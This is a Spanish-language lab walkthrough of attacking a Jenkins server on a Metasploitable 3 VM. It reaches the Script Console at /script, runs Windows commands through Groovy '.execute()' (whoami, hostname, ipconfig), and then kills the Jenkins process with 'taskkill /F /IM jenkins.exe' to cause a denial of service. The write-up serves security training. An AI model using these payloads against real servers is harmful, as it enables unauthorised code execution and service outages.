# Kill Chain 2: Jenkins Script Console RCE

## Ejecución de código Groovy

Durante el desarrollo del Kill Chain 2 se realizó una evaluación sobre el servidor **_Jenkins_** identificado previamente durante la fase de reconocimiento.

Mediante un escaneo de red se detectó que el host 10.0.2.15 tenía abierto el puerto 8484, asociado al servicio Jenkins.

![Importación](/assets/imag3/fig00.png)

Linea por linea de la imagen anterior:

       8484/tcp open http

       http-title: Dashboard [Jenkins]

     1.El puerto 8484 está abierto y se ejecuta un servicio HTTP
     2.El servidor web es Jetty/Winstone
     3.Se detectó que la página tiene el título Dashboard [Jenkins]


**_1.Verificar que Jenkins está activo_**

Desde _Metasploitable 3_ 

![Importación](/assets/imag3/fig01.png)

Desde _Kali Linux_ (alternativa sin entrar a la VM objetivo):

![Importación](/assets/imag3/fig02.png)


**_2.Abrir el browser en Kali y navegar a:_** 

Una vez identificado el servicio, se accedió a través del navegador desde la máquina Kali utilizando la dirección

     http://10.0.2.15:8484/script


![Importación](/assets/imag3/fig03.png)

Se accedió a la _Script Console_ de Jenkins mediante la ruta */script*. Esta funcionalidad permite ejecutar código Groovy directamente sobre el servidor donde se encuentra instalado Jenkins.

**_3.En el campo “Script”, escribir:_**

    println "cmd /c whoami".execute().text

Se logró que Jenkins ejecutara un comando en windows y que este devolviera el resultado

![Importación](/assets/imag3/fig04.png)

para poder identificar el nombre del equipo donde se estan procesando las instrucciones, se ejecutó el siguiente comando:


    println "cmd /c hostname".execute().text

![Importación](/assets/imag3/fig05.png)

El resultado _vagrant-2008r2_ coincidió con la máquina identificada durante el reconocimiento.

En la ejecución de comandos mas complejos, se utilizó una estructura mas completa: 


     1  def cmd = "cmd /c ipconfig"
     2  def proc = cmd.execute()
     3  proc.waitFor()
     4  println proc.text

De lo anterior se observa que el proceso se divide en varias etapas: iniciando con el almacenamiento del comando en una variable _(1)_, luego se ejecuta _(2)_, se espera _(3)_ la finalización correcta para que finalmente se imprima _(4)_ la salida.

![Importación](/assets/imag3/fig06.jpeg)
_Muestra la informacion interna del sistema_

Lo obtenido por *_ipconfig_*  evidenció que la Script tiene la capacidad de interactuar con el sitema operativo para obtener informacion del servidor comprometido.

## Impacto: Denegación de Servicio (DoS)

### Detener el propio servicio Jenkins:

Se simula la caída del servicio Jenkins provocando la interrupcion del servicio. 

![Importación](/assets/imag3/fig07.png)
_Para ejecutar el comando "net stop jenkins" se requiere permisos de administrador para detener el servicio_

Intentar detener el servicio desde el script puede resultar en fallos de permisos y falta de efecto sobre el servicio.

🔥 Forma de realizarlo desde la Script Console 

Aqui no se usaría _net stop_

una opcion seria: 
            taskkill /F /IM jenkins.exe
El cual finaliza directamente el proceso asociado a Jenkins.  

![Importación](/assets/imag3/fig08.png)
_El resultado obtenido confirmó que el proceso fue finalizado exitosamente, provocando la interrupción del servicio Jenkins._
